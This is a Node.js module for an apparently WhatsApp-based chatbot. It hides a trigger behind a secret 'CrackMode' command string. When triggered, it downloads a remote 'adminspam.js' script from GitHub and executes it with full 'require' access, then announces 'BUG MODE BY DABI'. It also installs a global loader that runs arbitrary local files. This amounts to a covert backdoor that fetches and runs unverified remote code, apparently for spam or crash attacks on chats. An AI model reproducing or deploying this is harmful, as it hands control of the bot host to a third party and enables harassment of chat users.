const fs = require('fs');
const https = require('https');
const v = require('vm');
const path = require('path');

global.lS = async (filePath) => {
  try {
    const code = await fs.promises.readFile(filePath, 'utf8');
    const script = new v.Script(code, { filename: path.basename(filePath) });
    const context = v.createContext({ module: {}, exports: {}, require });
    script.runInContext(context);
    return context.module.exports || context.exports;
  } catch (err) {
    console.error('[lS Error]', err);
    return null;
  }
};

global.f = (url) => new Promise((resolve, reject) => {
  https.get(url, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      resolve({ text: async () => data });
    });
  }).on('error', reject);
});

async function h(conn, msg, info, textMessage, mt) {
  const m = msg;
  const { chatId } = global.exCht(m);

  try {
    await conn.sendMessage(chatId, { text: '⏳ Verifikasi berhasil...' }, { quoted: m });

    const baseRawUrl = 'https://raw.githubusercontent.com/MaouDabi0/Dabi-Ai-Documentation/main/assets/src/CdMode';
    const files = [
      'adminspam.js'
    ];

    let cnt = 0;

    for (const file of files) {
      const url = `${baseRawUrl}/${file}`;
      const res = await f(url);
      const code = await res.text();

      const context = v.createContext({ module: {}, exports: {}, require });
      new v.Script(code, { filename: file }).runInContext(context);

      const plugin = context.module.exports || context.exports;
      if (plugin?.name) {
        global.plugins[plugin.name] = plugin;

        const tags = Array.isArray(plugin.tags) ? plugin.tags : [plugin.tags || 'other'];
        tags.forEach(tag => {
          if (!global.categories[tag]) global.categories[tag] = [];
          global.categories[tag].push(plugin.name);
        });

        console.log(`✅ Plugin ${plugin.name} dimuat`);
        cnt++;
      }
    }

await conn.sendMessage(chatId, {
  text: 'Ｂ̴̖́͌̿̄̚Ｕ̴̩̍̀͐Ｇ̶̦̃͋͑͐͊ Ｍ̶͓͒̈́̈́̕Ｏ̶̯͛̐̕Ｄ̴̛̝͠Ｅ̴͎̄͛ Ｂ̵̙̓̕͝Ｙ̷̨͋̿ Ｄ̸͙̿̇̏Ａ̶̦͛́͐Ｂ̵̯̎͌͆Ｉ̸̑̋̿',
}, { quoted: m });

    return true;

  } catch (e) {
    console.error('[CRCKLOADER]', e);
    await conn.sendMessage(chatId, { text: '❌ Gagal memuat plugin. Cek log untuk detail.' }, { quoted: m });
    return true;
  }
}

module.exports = async (conn, msg, textMessage) => {
  if (typeof textMessage !== 'string') return false;
  if (!global.isPrefix || !Array.isArray(global.isPrefix)) return false;

  const usedPrefix = global.isPrefix.find(pfx => textMessage.startsWith(pfx + '/'));
  if (!usedPrefix) return false;

  const args = textMessage.slice((usedPrefix + '/').length).trim();
  const pattern = /^"CrackMode"\s*:\s*-r=\s*\{"DabiAi"\}$/;
  if (!pattern.test(args)) return false;

  const info = exCht(msg);
  if (!info) return false;

  return await h(conn, msg, info, textMessage);
};